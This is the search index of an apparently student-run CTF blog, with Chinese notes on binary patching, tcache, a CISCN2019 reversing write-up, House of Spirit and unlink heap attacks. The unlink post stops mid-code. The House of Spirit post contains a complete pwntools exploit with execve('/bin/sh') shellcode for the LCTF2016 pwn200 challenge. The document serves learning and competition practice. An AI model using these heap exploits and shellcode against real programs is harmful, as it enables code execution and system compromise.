{"pages":[{"title":"404","text":"","path":"404/index.html","date":"07-09","excerpt":""},{"title":"about","text":"此人， CTF的二进制萌新23333~ 于此记录自己的一点一滴成长：） 希望与各位一起进步鸭！ 大佬们，求带飞~","path":"about/index.html","date":"07-09","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"07-09","excerpt":""},{"title":"","text":"开坑计划23333 看雪CTF CTF-wiki Fastbin Attack 汇编下的各类加密的特征初探","path":"todo/index.html","date":"04-04","excerpt":""}],"posts":[{"title":"Day1 - Patch","text":"在国赛半决赛中出现过的要求，就是修补漏洞，但是不能对原文件改动太大，不然过不了check。然后昨天看到今年国赛的决赛赛制，是awd。似乎是一队维护&gt;=10个gamebox额，第一次打awd，听起来想放弃23333不如删掉flag文件算了，或者关机orz还是学学吧2333 IDA对于缓冲区溢出的漏洞，可以使用IDA。啊，这个魅力无处安放的女人。 比如缓冲区大小比可读入的字节小，这时候就可以直接使用IDA，在对应的汇编指令处修改读入的字节数。然后应用到原文件中，这样改动不大也能完成修补，就很简便。 [此处应有例子] LIEF一个开源的跨平台库，可以解析、修改和抽象ELF、PE和MachO格式 安装12pip install setuptools --upgradepip install lief 使用LIEF增加段源代码（64位） 12345678910//vuln.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; printf(\"/bin/sh\"); puts(\"a test\"); return 0;&#125; 目的是将printf修改成自己的函数 首先编写自己的函数 使用gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared func.c -o hook编译 12345678910111213141516171819//func.c __asm( \"mov $0x0, %rdx\\n\" \"mov $0x0, %rsi\\n\" \"mov $0x3b,%rax\\n\" \"syscall\\n\" );&#125;void my_printf(char *a)&#123; asm( \"mov %rdi,%rsi\\n\" \"mov $0,%rdi\\n\" \"mov $0x20,%rdx\\n\" \"mov $0x1,%rax\\n\" \"syscall\\n\" );&#125; 方式一，修改got表然后使用LIEF注入到文件中 123456789101112131415#!/usr/bin/env python3#-*- coding:utf-8 -*-import liefbinary = lief.parse('./vuln')hook = lief.parse('./hook')segment_added = binary.add(hook.segments[0])my_printf = hook.get_symbol('myprintf')my_printf_addr = segment_added.virtual_address + my_printf.valuebinary.patch_pltgot('printf', my_printf_addr)binary.write('vunl.patd') 然后执行注入后的程序 但是两个文件大小相差很大。。。 方式二，修改指定位置的call函数使用以下脚本可以修改指定位置的call函数 123456789101112131415161718192021222324252627#!/usr/bin/env python3#-*- coding:utf-8 -*-import lieffrom pwn import *binary = lief.parse('./vuln')hook = lief.parse('./hook')segment_added = binary.add(hook.segments[0])my_printf = hook.get_symbol('myprintf')my_printf_addr = segment_added.virtual_address + my_printf.value#binary.patch_pltgot('printf', my_printf_addr)def patch_call(file, sour, dist, arch = \"amd64\"): print(hex(dist)) length = p32((dist - (sour + 5 )) &amp; 0xffffffff) order = b'\\xe8'+length print(disasm(order,arch=arch)) file.patch_address(sour ,[i for i in order])tar_addr = 0x400574patch_call(binary,tar_addr,my_printf_addr)binary.write('vuln.patched') 修改.eh_frame段这个段本身有可执行权限，而且本身作用不大（貌似跟处理异常相关）。这样可以将代码写在这个部分，然后程序变化也不会很大。 就可以直接将hook函数中的代码写到eh_frame段中去，然后修改call的跳转，完成patch 12345678bin_frame = binary.get_section('.eh_frame')hook_text = hook.get_section('.text')bin_frame.content = hook_text.contentdisaddr = bin_frame.virtual_addresstaraddr = 0x400574patch_call(binary, taraddr, disaddr) 这样就能直接跳转过来了 参考链接 P4nda e3pem","path":"2019/07/17/day1_patch/","date":"07-17","excerpt":"在国赛半决赛中出现过的要求，就是修补漏洞，但是不能对原文件改动太大，不然过不了check。然后昨天看到今年国赛的决赛赛制，是awd。似乎是一队维护&gt;=10个gamebox额，第一次打awd，听起来想放弃23333不如删掉flag文件算了，或者关机orz还是学学吧2333"},{"title":"Day 0 - tcache","text":"嘛，本来是暑假一开始就准备的企划orz，然后短学期之前的部分没记录23333。整个记录顺便防止自己整日荒废然后比赛暴毙orz。这个系列都是堆相关的漏洞利用，主要参考资料是ctf-wiki，以及询问大佬。。。哈吉马路哟 参考资料 ctf-wiki TCACHEtcache是glibc2.26以后新加入的机制。从名字来看是一个类似内存的cache那样的加速的东西。系统为每个线程增加bin缓存，默认情况下，每个线程有64个bins，大小从24（32位下12），以16（32位下8）递增至1032（32位下516）。每个bins默认最多容纳7个chunk。 tcache对chunk的检查很少，难怪wiki上有一句“tcache makes heap exploitation easy again”。 将chunk放入tcache 在放入chunk时，free函数检查对其和前后堆块释放情况，然后优先将chunk放入tcache中。 在malloc中，也有将内存块放入tcache的情况： 如果申请的是fastbin大小的块并且在fastbin内找到可用的块时，会将该链上的其他内存块放入tcache中 如果申请的是smallbin大小的块并且在smallbin在找到可用的块时，将该链上的其他内存块放入tcache中 如果是处理unsorted bin，那么当找到一个大小合适的块时，会将其放入tcache中，然后继续寻找，而不是直接返回。 从tcache中取出chunk 在malloc时，如果tcache中有大小合适的chunk，从tcache中获取 遍历完unsorted bin之后，如果tcache中有大小合适的chunk，从tcache中获取 在循环处理unsorted bin内存块时，如果达到放入tcache的unsorted bin上限时，会直接返回。但是一般默认是0（没有上限） 利用方式tcache poisoning因为tcache检查很松，可以通过覆盖rcache的next，不需要构造任何chunk即可实现malloc到任何地址 tcache dup类似fastbin dup，由于检查几乎没有，所以可以多次free同一个chunk。 tcache house of spirit通过控制栈上的内容，在栈上布置fake chunk，然后free掉，这样可以通过malloc得到一块栈上的空间。 smallbin unlink在smallbin中包含空闲块时，会同时将同大小的其他空闲块放入tcache中，此时会出现解链操作。但是相比于unlink宏，缺少链的完整性校验。原本的unlink操作在该条件下也能使用。 libc leak需要先将tcache填满，再进行libc leak。 overlapping chunk更改指定chunk的size，使之增大。那么在释放再分配时就能造成堆块交叉。 应用例子待填orz 之前的堆块利用方式还没看完。。。学完再填","path":"2019/07/16/day0_tcache/","date":"07-16","excerpt":"嘛，本来是暑假一开始就准备的企划orz，然后短学期之前的部分没记录23333。整个记录顺便防止自己整日荒废然后比赛暴毙orz。这个系列都是堆相关的漏洞利用，主要参考资料是ctf-wiki，以及询问大佬。。。哈吉马路哟"},{"title":"CISCN2019线上re","text":"可以说，ciscn是我至今为数不多能做出题的比赛了23333菜的真实 0x00 easyGO看名字是go语言和题目，用ida打开看看，wdm这函数数量，怕了怕了。首先运行，然后ida搜索字符串，通过交叉引用，找到主要逻辑，简单分析了一下发现还是有点复杂，还是上手gdb调试看看。 设置断点在提示输入的地方，然后开始运行。发现输入后过了不久，程序就取出一长串字符串。 猜测可能是目标字符串，需要与之进行比对。继续调试。 在经过函数0x47e620这个函数之后，flag已经解出来了。 0x01 bbvvmm文件使用ida打开，发现主要逻辑还是挺明显的。输入用户名和密码，分别校验，对了就能登陆拿到flag，是有远程环境的。 用户名 通过逆运算，sub_400AA6是个换了表的BASE64加密，通过写解密代码，解得正确的v33应该为“EF468DBAF985B2509C9E200CF3525AB6”。 然后观察到sub_401738函数的参数都与输入无关，且v10要作为sub_4018C4的输入，则通过调试，直接得到v10的值为： 然后对于函数sub_4018c4，除了v13以外所有的参数都已知，所以可以推断出v13 的值。查看这个函数 通过分析，这个函数中只有sub_201362起作用，循环只经历了一次，相当于只进行了一次sub_201362操作。 目前已知v5，这样可以知道v14,v13,v12,v11的值，while循环的初值是s,v8,v9,v10，循环中函数是异或操作，于是我们可以通过反推得到函数的输入v3。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133#include &lt;stdio.h&gt;#define __int64 long long#define __int8 char#define _BYTE unsigned char#define _WORD unsigned short#define _DWORD unsigned int#define LOBYTE(x) (*((_BYTE*)&amp;(x))) // low byte #define LOWORD(x) (*((_WORD*)&amp;(x))) // low word #define LODWORD(x) (*((_DWORD*)&amp;(x))) // low dword #define HIBYTE(x) (*((_BYTE*)&amp;(x)+1)) #define HIWORD(x) (*((_WORD*)&amp;(x)+1)) #define HIDWORD(x) (*((_DWORD*)&amp;(x)+1)) #define BYTEn(x, n) (*((_BYTE*)&amp;(x)+n)) #define WORDn(x, n) (*((_WORD*)&amp;(x)+n)) #define BYTE1(x) BYTEn(x, 1) // byte 1 (counting from 0) #define BYTE2(x) BYTEn(x, 2) #define BYTE3(x) BYTEn(x, 3) #define BYTE4(x) BYTEn(x, 4)unsigned char data[]=&#123; 0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62, 0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8, 0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35, 0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87, 0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E, 0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1, 0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3, 0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F, 0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51, 0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8, 0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0, 0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84, 0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48, 0xC6, 0xBA, 0xB1, 0xA3, 0x00, 0x00, 0x00, 0x00, 0x50, 0x33, 0xAA, 0x56, 0x00, 0x00, 0x00, 0x00, 0x97, 0x91, 0x7D, 0x67, 0x00, 0x00, 0x00, 0x00, 0xDC, 0x22, 0x70, 0xB2, 0x00, 0x00, 0x00, 0x00&#125;;long long table[]=&#123;0x0078da27f844fdd1,0x0011508c60fc86a8, 0x00424adbca3c9b78,0x001edff37133dadc, 0x002d6f30b72f5731,0x00646f38d17560d5, 0x006a9ec9f150e4ad,0x0047c478c16d51b7, 0x00654ac0925a0855,0x002acd03e72b4d73, 0x006c607809a5a671,0x00061673df68b5ba, 0x007723b0becf17c0,0x004cd4e74b53dc65, 0x001d0f96c282ec15,0x00547c7686512b09, 0x001b65c1b9383cbc,0x006dd7967009d87f, 0x000afb8629d9217a,0x00490d14437c248b, 0x001efc829bc5cfbe,0x005b8ef37683e1b6, 0x0054de5a1d64849f,0x00068a31fa1fa382, 0x004770760f09a64c,0x00636d44915d5beb, 0x00621e68982b67bc,0x003825cf5fd2e1e6, 0x004cd057e794f4f6,0x00772696beb95357, 0x0045fd07fb3bcfc0,0x0066505eb43dc7dd&#125;;unsigned char sub_400D38(unsigned char a1)&#123; return data[a1];&#125;unsigned __int64 __fastcall sub_400D87(int a1)&#123; unsigned __int8 v1; // ST30_1 unsigned __int8 v2; // ST31_1 unsigned __int8 v3; // ST32_1 unsigned __int8 v4; // al unsigned __int64 v5; // ST10_8 v1 = sub_400D38(BYTE3(a1)); v2 = sub_400D38(BYTE2(a1)); v3 = sub_400D38(BYTE1(a1)); v4 = sub_400D38(a1); v5 = ((unsigned __int64)v3 &lt;&lt; 8) | ((unsigned __int64)v2 &lt;&lt; 16) | ((unsigned __int64)v1 &lt;&lt; 24) | v4; return (((unsigned __int64)((v3 &lt;&lt; 8) | (v2 &lt;&lt; 16) | (v1 &lt;&lt; 24) | (unsigned int)v4) &lt;&lt; 18) | (v5 &gt;&gt; 14)) ^ v5 ^ (4LL * ((v3 &lt;&lt; 8) | (v2 &lt;&lt; 16) | (v1 &lt;&lt; 24) | (unsigned int)v4) | (v5 &gt;&gt; 30)) ^ (((unsigned __int64)(unsigned int)v5 &lt;&lt; 10) | (v5 &gt;&gt; 22)) ^ (((unsigned __int64)((v3 &lt;&lt; 8) | (v2 &lt;&lt; 16) | (v1 &lt;&lt; 24) | (unsigned int)v4) &lt;&lt; 24) | (v5 &gt;&gt; 8));&#125;void test(char c)&#123; int i,j,k; int a,b; a = (c&amp;0xf)+0x30; b = (c&gt;&gt;4)+0x30; if(b&lt;=0x39) printf(\"%02x \",b); else printf(\"%02x \",b+7); if(a&lt;=0x39) printf(\"%02x \",a); else printf(\"%02x \",a+7); printf(\"%c\\n\",c);&#125; int main()&#123; int res[64]; res[35] = 0xef468dba; res[34] = 0xf985b250; res[33] = 0x9c9e200c; res[32] = 0xf3525ab6; int i,j,k; for(i=31;i&gt;=0;i--) &#123; res[i] = res[i+4]^sub_400D87(res[i+1]^res[i+2]^res[i+3]^table[i]); &#125; printf(\"0x%x\\n0x%x\\n0x%x\\n0x%x\\n\",res[0],res[1],res[2],res[3]); int s = &#123;0xe9,0x55,0x47,0x9b,0x8a,0x0a,0x0f,0xfd,0x82,0x24,0x5f,0x47,0x33,0x85,0x91,0xc4&#125;; for(i=0;i&lt;128;i++) &#123; test(i); &#125; return 0;&#125; 于是可以得到v3={0x36, 0x32, 0x36, 0x31, 0x36, 0x34, 0x37, 0x32, 0x36, 0x35, 0x37, 0x32, 0x33, 0x31, 0x33, 0x32}； 这样我们得到v13的值，再进一步回推sub_4066c0，就可以到正确的输入。 可以发现是把一个字节扩展为两个字节的函数，而替换表刚刚的脚本已经一同打印出来了，通过比对，得到用户名为：’badrer12’ 密码密码部分是一个使用while循环实现的虚拟机，通过分析各个调用表的函数内容，得到的伪汇编代码如下（部分）： 实现的功能是将输入与’x’,’y’,’z’,’{‘,’|’,’}’分别异或，然后把每次异或的结果异或，并且要求得到0，这样就说明密码就是’xyz{|}’。 最后远程需要借助pwntools，不然莫得回显 12345678910111213141516#!/usr/bin/python#-*- coding:UTF-8 -*-from pwn import*context.log_level = 'debug'p = remote('39.106.224.151', 10001)p.recvuntil('name')p.sendline('badrer12')p.recvuntil('word:')p.send('xyz&#123;|&#125;')p.interactive() 0x02 总结emmm国赛只会做两个逆向。。。其中一个还是调试得到。。。 不过对于虚拟机这样的题又练了手，之前一直觉得这类题好难，看不懂，其实主要是不够耐心（卒。希望在接下来的比赛中能多做几道逆向。。。不然太划水感觉都要被t出队伍了QAQ","path":"2019/05/12/ciscn2019net/","date":"05-12","excerpt":"可以说，ciscn是我至今为数不多能做出题的比赛了23333菜的真实"},{"title":"Study Note - House of Spirit","text":"学习总结，一个理解起来比较简单的堆的漏洞利用，是Fastbin Attack之一。 环境：Ubuntu16.04 64bit 文件：pwn200 参考：wiki、how2heap、fanda、BruceFan 0x00 House of Spirit原理这个需要先了解glibc的fastbin机制，大致上fastbin里的堆块大小都在2*SIZE_SZ ~ av-&gt;system_mem的范围之内，在x64的机器上，就是大于16字节，小于128字节（32位系统默认是8字节到64字节）。由于fastbin采取LIFO策略，最近释放的chunk会被更早地分配。这样的话，我们能组织House of Spirit攻击。 12345678910111213+--------------+| || controllable | //可控区域1| |+--------------+| ||uncontrollable| //不可控区域(目标控制区域)| |+--------------+| || controllable | //可控区域2| |+--------------+ 在这种情形中，我们可以构造可控区域1和可控区域2，然后覆盖一个堆指针，使之指向可控区域1，然后free该块区域，使之进入到fastbin中，然后重新申请该区域，那么不可控区域就变得可操作了。 利用思路1，我们需要通过可控区域1和可控区域2，把这个区域伪造成一个fast chunk 2，覆盖一个堆指针，让这个指针指向fast chunk 3，free这个fast chunk 4，申请刚刚释放的区域，这样不可控区域就变得可控了 free时，相关代码如下： 12345678910111213141516__libc_free (void *mem)&#123; mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ p = mem2chunk (mem); if (chunk_is_mmapped (p)) /* release mmapped memory. */ &#123; munmap_chunk (p); return; &#125; ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0);&#125; 要将堆块释放到fastbin，需要满足一些限制： fake chunk的ISMMAP位不能为1，当free时，如果时mmap的chunk，会做单独处理 fake chunk地址需要对齐，MALOC_ALIGN_MASK 123456789#ifndef INTERNAL_SIZE_T# define INTERNAL_SIZE_T size_t#endif/* The corresponding word size. */#define SIZE_SZ (sizeof (INTERNAL_SIZE_T))/* The corresponding bit mask value. */#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1) fake chunk的size大小需要满足对应的fastbin的需求，同时也得对齐 fake chunk的next chunk的大小不能小于2 * SIZE_SZ，同时也不能大于av-&gt;system_mem fake chunk对应的fastbin链表头部不能是该fake chunk，既不能构成double free的情况 0x01 栗子借用how2heap的例子，源网页在此。 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, \"This file demonstrates the house of spirit attack.\\n\"); fprintf(stderr, \"Calling malloc() once so that it sets up its memory.\\n\"); malloc(1); fprintf(stderr, \"We will now overwrite a pointer to point to a fake 'fastbin' region.\\n\"); unsigned long long *a; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); fprintf(stderr, \"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\\n\", sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]); fprintf(stderr, \"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\\n\"); fprintf(stderr, \"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n\"); fake_chunks[1] = 0x40; // this is the size fprintf(stderr, \"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\\n\"); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks[9] = 0x1234; // nextsize fprintf(stderr, \"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n\", &amp;fake_chunks[1]); fprintf(stderr, \"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n\"); a = &amp;fake_chunks[2]; fprintf(stderr, \"Freeing the overwritten pointer.\\n\"); free(a); fprintf(stderr, \"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n\", &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, \"malloc(0x30): %p\\n\", malloc(0x30));&#125; 通过将fake_chunk[1]作为fast chunk的size，fake_chunk[9]作为fast chunk下一个chunk的size，然后把指针a指向fake_chunk[2]，完成构造，然后free，再次申请，就能把对应区域申请回来。 House of Spirit的技术关键在于合理构造目标区域前后的数据，然后绕过相关的检测。 0x02 pwn200(LCTF2016)刚开始的函数是这样的 1234567891011121314151617181920int sub_400A8E()&#123; signed __int64 i; // [rsp+10h] [rbp-40h] char v2[48]; // [rsp+20h] [rbp-30h] puts(\"who are u?\"); for ( i = 0LL; i &lt;= 47; ++i ) &#123; read(0, &amp;v2[i], 1uLL); if ( v2[i] == 10 ) &#123; v2[i] = 0; break; &#125; &#125; printf(\"%s, welcome to xdctf~\\n\", v2); puts(\"give me your id ~~?\"); input_max4(); return sub_400A29();&#125; 可以看到v2可以刚好填满而没有0结尾，所以可以泄露出rbp。 啊自己尝试写了一下，惨不忍睹2333，还是搬运BruceFan的利用exp吧。。。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/usr/bin/python#coding:utf-8from pwn import *#r = remote('127.0.0.1', 6666)p = process(\"./pwn200\")shellcode = \"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"def pwn(): # gdb.attach(p, \"b *0x400991\") data = shellcode.ljust(46, 'a') data += 'bb' p.send(data) p.recvuntil('bb') rbp_addr = p.recvuntil(', w')[:-3] rbp_addr = u64(rbp_addr.ljust(8,'\\x00')) print hex(rbp_addr) fake_addr = rbp_addr - 0x90 shellcode_addr = rbp_addr - 0x50 # 输入id伪造下一个堆块的size p.recvuntil('id ~~?') p.sendline('32') p.recvuntil('money~') data = p64(0) * 5 + p64(0x41) # 伪造堆块的size data = data.ljust(0x38, '\\x00') + p64(fake_addr) # 覆盖堆指针 p.send(data) p.recvuntil('choice : ') p.sendline('2') # 释放伪堆块进入fastbin p.recvuntil('choice : ') p.sendline('1') p.recvuntil('long?') p.sendline('48') p.recvuntil('\\n48\\n') # 将伪堆块申请出来 data = 'a' * 0x18 + p64(shellcode_addr) # 将eip修改为shellcode的地址 data = data.ljust(48, '\\x00') p.send(data) p.recvuntil('choice : ') p.sendline('3') # 退出返回时回去执行shellcode p.interactive()if __name__ == '__main__': pwn() 0x03 总结这个利用起来真的要计算清楚位置和大小，而且要熟练掌握chunk的结构。然后就是各种小地方的问题，要多调试。。。 fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 构造好目标区域前后的数据。在House of Spirit中重要的好像就是两个地方的size以及size的标记位，其他的可以不管，比如pre size这样的就不需要，总的来说还是比unlink需要构造的地方少一点，好像（萌新之言。。。","path":"2019/04/03/studypwn_houseofspirit/","date":"04-03","excerpt":"学习总结，一个理解起来比较简单的堆的漏洞利用，是Fastbin Attack之一。"},{"title":"Study Note - Unlink","text":"啊，花了一天多的时间来弄懂unlink的原理和一个简单的应用。只能说，pwn真好玩，就是头上有点凉，就是我太菜了。写个学习笔记记录一下，以免忘了。。。 环境：Ubuntu16.04 文件：unlink 参考：how2pwn、堆溢出之unlink的利用、unsafe-unlink demo、wiki 0x00 Unlink在弄清楚unlink之前，需要先了解一下glibc的内存管理。 unlink发生在当释放一个堆块P时，glibc会检查与这个堆块物理相邻的堆块(假设是)S是否是空闲的，如果是的话，就会unlink(S)，然后合并两个堆块P、S。 malloc_chunk的定义是这样子的： 1234567891011121314151617/* This struct declaration is misleading (but accurate and necessary). It declares a \"view\" into memory allowing access to necessary fields at known offsets from a given base. See explanation below.*/struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ //上一个chunk的大小 INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ //这个chunk的大小 //如果本chunk不是空闲的，这里开始存着用户数据 struct malloc_chunk* fd; /* double links -- used only if free. */ //如果本chunk是空闲的，这个指向下一个空闲的chunk struct malloc_chunk* bk; //如果本chunk是空闲的，这个指向上一个空闲的chunk /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; unlink的操作可以借助wiki上的图片： 可以看到，就是双向链表中删除节点P的操作。 12p-&gt;fd-&gt;bk = p-&gt;bk;p-&gt;bk-&gt;fd = p-&gt;fd; 然后P节点就被从链表中删除了。 0x01 利用简单的栗子假设这样一个堆块 12345678910111213141516+--------------+ &lt;- chunk0 ptr| prev_size |+--------------+| size |+--------------+ &lt;- chunk0| user data |+--------------+| unused bytes |+--------------+ &lt;- chunk1 ptr| prev_size |+--------------+| size |+--------------+ &lt;- chunk1| user data |+--------------+| ... | 现在chunk1已经是空闲状态了，当通过对chunk0的写能够溢出到chunk1的时候，我们覆盖user data部分的fd和bk指针，使fd = target addr - 12，bk = except value，然后我们free(chunk0)。这样的话glibc检查发现chunk1也是空闲的，就会发起合并操作，这样就会触发unlink(chunk1)，从而： 12chunk1-&gt;fd-&gt;bk = chunk1-&gt;bk; //效果就是target addr - 12 + 12 = except valuechunk1-&gt;bk-&gt;fd = chunk1-&gt;fd; //实际上对结构体元素的查找就是地址+元素偏移，fd相对于chunk ptr的偏移就是12 这样的话我们就能在target addr处是实现一个改写(如果有写权限的话)。 实际上然鹅，实际上unlink并没有这么顺利，unlink宏现在已经加了一个检查： 12345678910111213141516171819202122232425262728#define unlink(P, BK, FD) &#123; \\ FD = P-&gt;fd; \\ BK = P-&gt;bk; \\ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P); \\ else &#123; \\ FD-&gt;bk = BK; \\ BK-&gt;fd = FD; \\ if (!in_smallbin_range (P-&gt;size) \\ &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; \\ assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P); \\ assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P); \\ if (FD-&gt;fd_nextsize == NULL) &#123; \\ if (P-&gt;fd_nextsize == P) \\ FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \\ else &#123; \\ FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \\ &#125; \\ &#125; else &#123; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ &#125; \\ &#125; \\ &#125; \\ &#125; 可以看到第4行的检查，所以需要通过这个判断才行。简单的利用是不能通过的。 为了过判断，需要一个全局指针chunk_ptr，然后构造fake chunk，举个栗子： 12345678910111213141516171819202122+--------------+ &lt;- chunk_ptr //使全局变量指向堆块| prev_size |+--------------+| size |+--------------+ - &lt;- chunk0|fake pre size | |+--------------+ || fake size | |+--------------+ ||&amp;chunk_ptr-12 | fake+--------------+ chunk| &amp;chunk_ptr-8 | |+--------------+ || unused bytes | |+--------------+ - &lt;- chunk1 ptr|new prev_size |+--------------+| size |0|+--------------+ &lt;- chunk1| user data |+--------------+| ... | 在chunk0中伪造一个fake chunk，使得fake chunk.fd = chunk_ptr-12，fake chunk.bk = chunk_ptr-8，然后通过溢出，修改chunk1的prev_size为fake chunk的大小，然后要把chunk1的size的最低位改成0，表示前一个chunk(fake chunk)是空闲的。 然后free(chunk1)，然后就会触发unlink(fake chunk)，在进行检验的时候： 1234FD = chunk_ptr-&gt;fd = &amp;chunk_ptr-12BK = chunk_ptr-&gt;bk = &amp;chunk_ptr-8FD-&gt;bk = &amp;chunk_ptrBK-&gt;fd = &amp;chunk_ptr 所以，chunk_ptr就是指向fake chunk，也就是P，所以满足判断(FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P)，这样就能继续完成unlink，完成后结果就是 12FD-&gt;bk = chunk_ptr-&gt;bk; //使得*chunk_ptr = &amp;chunk_ptr-8BK-&gt;fd = chunk_ptr-&gt;fd; //使得*chunk_ptr = &amp;chunk_ptr-12 这样的的话chunk_ptr就会指向&amp;chunk_ptr-12的位置，也就是说，这样以后，就能把chunk_ptr改写成任意目标地址，然后再次往chunk_ptr中写，这样就能实现一次任意地址覆盖，从而控制程序流程。 0x02 栗子这里借用how2heap的例子，源地址。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;uint64_t *chunk0_ptr;int main()&#123; fprintf(stderr, \"Welcome to unsafe unlink 2.0!\\n\"); fprintf(stderr, \"Tested in Ubuntu 14.04/16.04 64bit.\\n\"); fprintf(stderr, \"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\\n\"); fprintf(stderr, \"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\\n\"); int malloc_size = 0x80; //we want to be big enough not to use fastbins int header_size = 2; fprintf(stderr, \"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\\n\\n\"); chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0 uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1 